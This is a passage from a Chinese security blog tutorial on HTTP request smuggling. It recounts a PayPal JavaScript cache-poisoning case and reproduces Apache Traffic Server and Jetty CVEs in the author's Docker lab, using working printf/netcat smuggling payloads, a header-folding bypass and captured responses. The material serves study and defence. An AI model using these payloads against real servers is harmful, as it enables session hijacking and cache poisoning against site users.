</span></span></span></code></pre></td></tr></table></div></div><p>该 Smugle 的请求会用<code>Foo: X</code>吃掉下一个发过来的请求头的第一行，也就是<code>GET /xxx HTTP/1.1</code>那一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/private/messages</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Foo</span><span class=o>:</span> <span class=l>XGET /static/some-image.png HTTP/1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span>
</span></span></code></pre></td></tr></table></div></div><p>只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p><p>至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。</p><h1 id=real-world>Real World</h1><h2 id=paypal>Paypal</h2><p>首先肯定得来聊聊今年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例了</p><p>作者首先通过 HTTP Smuggling 的方式将一个用于 Paypal 登录的 js 文件进行了投毒：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
</span></span></span><span class=line><span class=cl><span class=err>Host: c.paypal.com
</span></span></span><span class=line><span class=cl><span class=err>Content-Length: 61 
</span></span></span><span class=line><span class=cl><span class=err>Transfer-Encoding: chunked
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>0
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=nf>GET</span> <span class=nn>/webstatic</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>skeletonscribe.net?</span>
</span></span><span class=line><span class=cl><span class=n>X</span><span class=o>:</span> <span class=l>XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>c.paypal.com</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>HTTP/1.1 302 Found
</span></span></span><span class=line><span class=cl><span class=g>Location: http://skeletonscribe.net?, c.paypal.com/webstatic/ 
</span></span></span></code></pre></td></tr></table></div></div><p>但是 Paypal 登录页面有 CSP 规则 <code>script-src</code> 限制了这个跳转。</p><p><img src=https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg loading=lazy></p><p>后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。</p><p><img src=https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg loading=lazy></p><p>再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。</p><p><img src=https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg loading=lazy></p><p>Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Transfer-Encoding:
</span></span><span class=line><span class=cl> chunked
</span></span></code></pre></td></tr></table></div></div><h2 id=ats>ATS</h2><blockquote><p>​ Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。</p><p>Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。</p><p>在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。</p><p>CVE-2018-8004 补丁列表</p><ul><li><a class=link href=https://github.com/apache/trafficserver/pull/3192 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3192</a></li><li><a class=link href=https://github.com/apache/trafficserver/pull/3201 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3201</a></li><li><a class=link href=https://github.com/apache/trafficserver/pull/3231 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3231</a></li><li><a class=link href=https://github.com/apache/trafficserver/pull/3251 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3251</a></li></ul><p>注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。</p></blockquote><p>关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分 <a class=link href=https://paper.seebug.org/1048/#4-httpcve-2018-8004 target=_blank rel=noopener>HTTP走私攻击实例——CVE-2018-8004</a></p><p>这里我们说一下原文没有的部分：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>														[dummy-host7.example.com]
</span></span><span class=line><span class=cl>                                        |
</span></span><span class=line><span class=cl>                                  +-[8080]-----+
</span></span><span class=line><span class=cl>                                  | 8007-&gt;8080 |
</span></span><span class=line><span class=cl>                                  |  ATS7      |
</span></span><span class=line><span class=cl>                                  |            |
</span></span><span class=line><span class=cl>                                  +-----+------+
</span></span><span class=line><span class=cl>                                        |
</span></span><span class=line><span class=cl>                                        |
</span></span><span class=line><span class=cl>                                  +--[80]----+
</span></span><span class=line><span class=cl>                                  | 8002-&gt;80 |
</span></span><span class=line><span class=cl>                                  |  Nginx   |
</span></span><span class=line><span class=cl>                                  |          |
</span></span><span class=line><span class=cl>                                  +----------+
</span></span></code></pre></td></tr></table></div></div><p>我们构建以上场景，可以使用我搭建的 docker 实验环境 <a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1 target=_blank rel=noopener>lab1</a></p><h3 id=request-splitting-using-huge-header>Request Splitting using Huge Header</h3><p>我们可以通过使用 65535 个字符的 header 来进行实验，比如说我们可以通过使用以下代码来发送一个含有 65535 个字符的 header 的请求到 ATS 7:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET_/something.html?zorg2=5_HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:_dummy-host7.example.com\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;X:_&#34;%65534s&#34;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span>tr <span class=s2>&#34; &#34;</span> <span class=s2>&#34;1&#34;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span>tr <span class=s2>&#34;_&#34;</span> <span class=s2>&#34; &#34;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8007</span>
</span></span></code></pre></td></tr></table></div></div><p>nginx 的返回会直接返回 400 错误，但是有 ATS 7 就比较有趣了，我们会得到一个 400 响应以及 ATS 7 的 200 响应</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>400</span> <span class=ne>Invalid HTTP Request</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 18:52:42 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>ATS/7.1.1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-store</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html</span>
</span></span><span class=line><span class=cl><span class=n>Content-Language</span><span class=o>:</span> <span class=l>en</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>220</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>HTML</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>HEAD</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>TITLE</span><span class=p>&gt;</span>Bad Request<span class=p>&lt;/</span><span class=nt>TITLE</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>HEAD</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>BODY</span> <span class=na>BGCOLOR</span><span class=o>=</span><span class=s>&#34;white&#34;</span> <span class=na>FGCOLOR</span><span class=o>=</span><span class=s>&#34;black&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>H1</span><span class=p>&gt;</span>Bad Request<span class=p>&lt;/</span><span class=nt>H1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>HR</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>FONT</span> <span class=na>FACE</span><span class=o>=</span><span class=s>&#34;Helvetica,Arial&#34;</span><span class=p>&gt;&lt;</span><span class=nt>B</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>Description: Could not process this request.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>B</span><span class=p>&gt;&lt;/</span><span class=nt>FONT</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>HR</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>BODY</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>ATS/7.1.1</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 18:52:42 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>119</span>
</span></span><span class=line><span class=cl><span class=n>Last-Modified</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 05:37:09 GMT</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>&#34;5de0ae85-77&#34;</span>
</span></span><span class=line><span class=cl><span class=n>X-Location-echo</span><span class=o>:</span> <span class=l>/index.html?replaced=0&amp;cache=8</span>
</span></span><span class=line><span class=cl><span class=n>X-Default-VH</span><span class=o>:</span> <span class=l>0</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>public, max-age=300</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Ranges</span><span class=o>:</span> <span class=l>bytes</span>
</span></span><span class=line><span class=cl><span class=n>Age</span><span class=o>:</span> <span class=l>0</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;&lt;</span><span class=nt>head</span><span class=p>&gt;&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Nginx default static page<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Hello World<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>It works!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=jetty>Jetty</h2><p>Jetty 有三个与 HTTP Smuggling 相关的 CVE：</p><ul><li><p>CVE-2017-7656 HTTP/0.9 issue</p><blockquote><p>​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.</p></blockquote></li><li><p>CVE-2017-7657 Chunk size attribute truncation</p><blockquote><p>​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.</p></blockquote></li><li><p>CVE-2017-7658 Double Content-Length</p><blockquote><p>​ In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.</p></blockquote></li></ul><p>对于 CVE-2017-7658 我们就不再探究了，因为之前也提过了，我们主要来看另外两个比较有意思的地方。</p><h3 id=http09>HTTP/0.9</h3><p>环境依旧可以使用我构建的 <a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty target=_blank rel=noopener>jetty lab 环境</a>，然后我们用如下方式发送一个标准的 HTTP/0.9 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET /?test=4564\r\n&#39;</span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8994</span>
</span></span></code></pre></td></tr></table></div></div><p>得到一个 400 响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>400</span> <span class=ne>HTTP/0.9 not supported</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html;charset=iso-8859-1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>65</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Jetty(9.4.9.v20180320)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Bad Message 400<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;&lt;</span><span class=nt>pre</span><span class=p>&gt;</span>reason: HTTP/0.9 not supported<span class=p>&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>接着我们加上版本标识：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET /?test=4564 HTTP/0.9\r\n\r\n&#39;</span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8994</span>
</span></span></code></pre></td></tr></table></div></div><p>虽然这是 HTTP/0.9 不支持的格式，但是也会有意外的收获，得到一个 200 响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>&lt;title&gt;Sample &#34;Hello, World&#34; Application&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body bgcolor=white&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;table border=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>&lt;tr&gt;
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>这里的响应没有 headers ，只有 body ，也就是这个请求被 HTTP/0.9 进行了解析。</p><p>而且更有意思的是，添加上 HTTP/0.9 不支持的 headers 也会有意外的收获，这里我们添加一个提取响应包部分内容的 header：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>printf &#39;GET /?test=4564 HTTP/0.9\r\n&#39;\
</span></span><span class=line><span class=cl>&#39;Range: bytes=36-42\r\n&#39;\
</span></span><span class=line><span class=cl>&#39;\r\n&#39;\
</span></span><span class=line><span class=cl>|nc -q 1 127.0.0.1 8994
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>, World
</span></span></code></pre></td></tr></table></div></div><p>会发现 body 内容被我们进行了提取，结合我们上文提到的结合 HTTP Version 进行的 HTTP Response Splitting ，我们可以进行各种花式攻击</p><h3 id=chunk-size-attribute-truncation>Chunk size attribute truncation</h3><p>我们利用以下代码发送请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;POST /?test=4973 HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;100000000\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;POST /?test=4974 HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-Length: 5\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 8994<span class=p>|</span>grep <span class=s2>&#34;HTTP/1.1&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后我们可以得到两个 200 响应可是按照 chunk 的标准，虽然第二个部分看起来是一个请求，但是实际上应该被算在 chunk data 当中，而问题就在这，jetty 返回了两个请求，把 100000000 当作了 0 ，也就是 chunk end 部分，所以就出现了两个请求的原因。</p><p>我们可以再进行一些尝试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;POST /?test=4975 HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;1ff00000008\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;abcdefgh\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;POST /?test=4976 HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-Length: 5\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 8994<span class=p>|</span>grep <span class=s2>&#34;HTTP/1.1&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里我们依然得到了两个 200 响应，也就是第一个 chunk size 1ff00000008 被 jetty 截断成了 8 ，也就是 chunk data 部分只有<code>abcdefgh</code>，所以就返回了两个响应。</p><p>与 Apache CVE-2015-3183 类似，jetty 只会取 chunk size 的最后8个字节：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ffffffffffff00000000\r\n
</span></span><span class=line><span class=cl>            ^^^^^^^^
</span></span><span class=line><span class=cl>            00000000 =&gt; size 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1ff00000008\r\n
</span></span><span class=line><span class=cl>   ^^^^^^^^
</span></span><span class=line><span class=cl>   00000008 =&gt; size 8
